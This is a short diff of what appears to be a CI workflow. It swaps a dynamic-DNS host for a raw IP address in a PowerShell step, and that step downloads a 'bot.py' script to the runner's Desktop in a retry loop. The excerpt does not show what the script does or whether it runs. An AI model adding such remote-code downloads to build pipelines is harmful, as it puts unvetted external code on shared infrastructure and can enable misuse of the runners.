@@ -93,7 +93,7 @@ jobs:
         shell: pwsh
         run: |
           $desktop = [Environment]::GetFolderPath("Desktop")
-          $botUrl = "http://ksa966.ddns.net:5000"
+          $botUrl = "http://143.14.44.211:5000"
           for ($i = 1; $i -le 3; $i++) {
               try {
                   Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
